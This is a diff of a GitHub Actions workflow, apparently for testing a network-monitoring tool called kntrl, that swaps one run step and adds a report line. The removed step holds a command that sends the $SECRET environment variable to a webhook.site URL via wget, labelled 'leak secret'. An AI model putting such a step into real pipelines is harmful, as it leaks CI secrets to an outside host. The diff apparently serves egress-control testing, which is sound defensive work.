@@ -47,12 +47,13 @@ jobs:
         # Runs a set of commands using the runners shell
       - name: Run allowed action
         run: |
-          echo "leak secret"
-          wget wget --connect-timeout=3 https://webhook.site/c2b54d74-0180-4d04-a3b2-55fe3a7b6f1f?secret=$SECRET || true
+          echo "download artifacts..."
+          wget wget --connect-timeout=3 https://download.kondukto.io/kntrl/myartifact.txt 
 
       # Runs a set of commands using the runners shell
       - name: print report
         run: |
+          echo "Print report"
           echo "---------------------"
           cat /tmp/kntrl.out
           echo "---------------------"
